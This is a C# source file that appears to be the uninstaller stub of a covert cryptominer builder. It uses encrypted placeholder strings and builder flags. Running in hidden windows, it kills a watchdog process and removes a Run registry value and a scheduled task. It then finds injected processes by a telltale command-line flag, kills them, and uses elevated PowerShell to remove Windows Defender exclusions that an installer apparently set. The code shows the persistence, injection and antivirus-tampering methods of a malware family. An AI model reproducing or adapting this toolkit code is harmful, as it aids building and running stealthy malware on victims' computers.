using System;
using System.IO;
using System.Reflection;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
using System.Resources;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Management;
#if DefDebug
using System.Windows.Forms;
#endif

[assembly: Guid("%Guid%")]

public partial class RUninstaller
{
    public static string rbD = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + RGetString("#LIBSPATH"));
#if DefSystem32
    public static string rbD2 = (Environment.SystemDirectory + @"\" + RGetString("#LIBSPATH"));
#endif

    public static void Main()
    {
#if DefInstall
        try
        {
            foreach (Process proc in Process.GetProcessesByName(RGetString("#WATCHDOG")))
            {
                proc.Kill();
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("U1: " + Environment.NewLine + ex.ToString());
#endif
        }

        try
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(RGetString("#REGKEY"), true))
            {
                if (key != null)
                {
                    key.DeleteValue(Path.GetFileName(PayloadPath));
                }
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("This exception is normal." + Environment.NewLine + "U2: " + Environment.NewLine + ex.ToString());
#endif
        }

        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = "/c schtasks /delete /f /tn " + "\"" + Path.GetFileNameWithoutExtension(PayloadPath) + "\"" + " & exit",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
            });
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("U3: " + Environment.NewLine + ex.ToString());
#endif
        }

#endif

        try
        {
            var options = new ConnectionOptions();
            options.Impersonation = ImpersonationLevel.Impersonate;
            var scope = new ManagementScope(@"\root\cimv2", options);
            scope.Connect();

            string wmiQuery = string.Format("Select CommandLine, ProcessID from Win32_Process where Name='{0}'", RGetString("#InjectionTarget"));
            var query = new ObjectQuery(wmiQuery);
            var managementObjectSearcher = new ManagementObjectSearcher(scope, query);
            var managementObjectCollection = managementObjectSearcher.Get();
            foreach (ManagementObject retObject in managementObjectCollection)
            {
                if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains("--cinit-find-x"))
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = "/c taskkill /f /PID " + retObject["ProcessID"] + " & exit",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                    });
                }
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("U4: " + Environment.NewLine + ex.ToString());
#endif
        }

        Thread.Sleep(3000);
        try
        {
            Directory.Delete(rbD, true);
#if DefSystem32
            Directory.Delete(rbD2, true);
#endif
#if DefInstall
            File.Delete(PayloadPath);
#endif
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("This exception is normal. " + Environment.NewLine + "U5: " + Environment.NewLine + ex.ToString());
#endif
        }

#if DefKillWD
        
        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = "/c powershell -Command Remove-MpPreference -ExclusionPath '%UserProfile%' & powershell -Command Remove-MpPreference -ExclusionPath '%AppData%' & powershell -Command Remove-MpPreference -ExclusionPath '%Temp%' & powershell -Command Remove-MpPreference -ExclusionPath '%SystemRoot%' & exit",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                Verb = "runas"
            });
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("U6: " + Environment.NewLine + ex.ToString());
#endif
        }
#endif
    }

    public static string RGetString(string rarg1)
    {
        return Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String(rarg1)));
    }

    public static byte[] RAES_Method(byte[] rarg1, bool rarg2 = false)
    {
        var rarg3 = Encoding.ASCII.GetBytes("#IV");
        var rarg4 = new Rfc2898DeriveBytes("#KEY", Encoding.ASCII.GetBytes("#SALT"), 100);
        var rarg5 = new RijndaelManaged() { KeySize = 256, Mode = CipherMode.CBC };
        var rarg6 = rarg2 ? rarg5.CreateEncryptor(rarg4.GetBytes(16), rarg3) : rarg5.CreateDecryptor(rarg4.GetBytes(16), rarg3);
        using (var rarg7 = new MemoryStream())
        {
            using (var rarg8 = new CryptoStream(rarg7, rarg6, CryptoStreamMode.Write))
            {
                rarg8.Write(rarg1, 0, rarg1.Length);
                rarg8.Close();
            }

            return rarg7.ToArray();
        }
    }
}